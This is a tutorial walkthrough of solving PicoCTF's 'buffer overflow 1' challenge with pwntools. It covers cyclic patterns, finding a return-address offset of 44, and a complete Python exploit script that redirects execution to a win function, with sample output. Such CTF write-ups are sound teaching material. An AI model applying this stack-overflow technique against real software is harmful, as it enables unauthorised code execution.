Let's build some familiarity with pwntools by using it on an actual challenge.
We'll use pwntools to beat PicoCTF's `buffer overflow 1` challenge. PicoCTF's 
challenges are free to play at https://play.picoctf.org.

When we start the challenge we are given the opportunity to download the 
executable as well as the source code. The source code is helpful, but it's not
going to be available for every challenge.

## Examining the provided source code
The source code shows that the program consists of 3 functions:
  * `main` - the starting point
  * `vuln` - called by `main` and has an obvious buffer overflow vulnerability 
  through it's use of `gets()`
  * `win` - the function which prints the flag if its reached

Analysis of the source code also shows that the program reads the flag from a 
file named `flag.txt` in the current directory. I recommend creating a test 
flag on your local machine using a format that matches the competitions flag 
formatting:

```bash
$ echo "picoCTF{testFlag}" > flag.txt
```

## About cyclic patterns
The next section uses pwntools' cli to generate a cyclic pattern. Cyclic 
patterns are a pattern in which every "n" character sequence is unique.

We can generate a cyclic sequence using `pwn cyclic [nbytes]`, where `nbytes`
is the number of bytes/characters to generate.

If we need to find where a specific sequence of bytes appears in the pattern,
we can call `pwn cyclic -l [pattern]`, where `pattern` is the character or 
byte sequence to search for. The value returned is the offset into the cyclic 
sequence that the characters appear at.

## Running the program
We can run the `vuln` application locally to get a feel for how the program 
operates:

```bash
$ chmod u+x ./vuln
$ ./vuln
Please enter your string: 
Hello
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

Since we suspect a buffer overflow, lets re-run it with a large input. I'm 
going to use pwntool's cyclic function to generate the (potential) overflow:

```bash
$ pwn cyclic 200 | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
Segmentation fault (core dumped)
```

We can see providing such an input crashes the program. In addition to that we 
can see the return address has been changed to "0x6161616c". 0x61 and 0x6c 
corraspond to printable ascii characters, which suggests the overflowing cyclic
pattern might be overwriting the return address.

We can use pwntool's cli to find the offset into the cyclic pattern that the 
return address is being set to:

```bash
$ pwn cyclic -l 0x6161616c
44
```

Pwntools is telling us that the byte sequence "0x6161616c" appears at an offset
of 44. This gives us enough information to start building an exploit.

## Writing the exploit
This challenge, like many other binary exploit challenges host a version of the
binary on a ncat server. This means that the final version of the exploit will
need to talk to the remote server. This is easy to do in pwntools, as you can 
replace your normal `process('vuln')` call with a call to `remote(host,port)`.

The exploit used for this challenge is below, we'll walk through this line-by-line:

```python
from pwn import *

context.arch = 'i386'           # executable was found to be a 32-bit application
context.os = 'linux'            # executable is intended to run on linux
elf = ELF('./vuln')             # ELF() gives us access to the symbol table and other useful info
p = elf.process()               # start an instance of the application that we can talk to locally

# the host and port was provided by PicoCTF, uncomment the next 3 lines when
#   ready to run against the competition server
# host = 'saturn.picoctf.net'
# port = 62067
# p = remote(host, port)

# context.log_level = 'debug'   # uncomment this line to get more verbose info on what is happening with our exploit

offset = 44                     # this was the offset found in the previous section

# I like to build my payloads as a list, but you could also contatenate byte strings directly
payload = [
    b'a'*offset,                # We need to add some bytes before our actual payload as padding. These don't do anything except take up space.
    p32(elf.symbols['win'])     # Since symbols haven't been stripped, we can use elf.symbols['win'] to get the address of the win function.
                                # We then wrap that call in p32() to pack it as a 32 bit address
    ]

raw_payload = b''.join(payload) # this flattens the list into a byte string
p.sendline(raw_payload)         # send that byte string to the program
print(p.recvall())              # print out all the data received back from the program
                                # if the exploit worked, then the flag will be in that output
```

The exploit script was saved as "ape.py". We can run our exploit script locally to see if it worked:

```bash
$ python3 ./ape.py
[*] '/home/picoctf/buffer_overflow_1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process '/home/picoctf/buffer_overflow_1/vuln': pid 7038
[+] Receiving all data: Done (109B)
[*] Process '/home/picoctf/buffer_overflow_1/vuln' stopped with exit code -11 (SIGSEGV) (pid 7038)
b'Please enter your string: \nOkay, time to return... Fingers Crossed... Jumping to 0x80491f6\npicoCTF{testFlag}\n'
```

Success! We see our test flag in the output (`picoCTF{testFlag}`)!

Now we can uncomment the host, port, and remote lines in the script, return 
it, and get the actual flag from the competition server.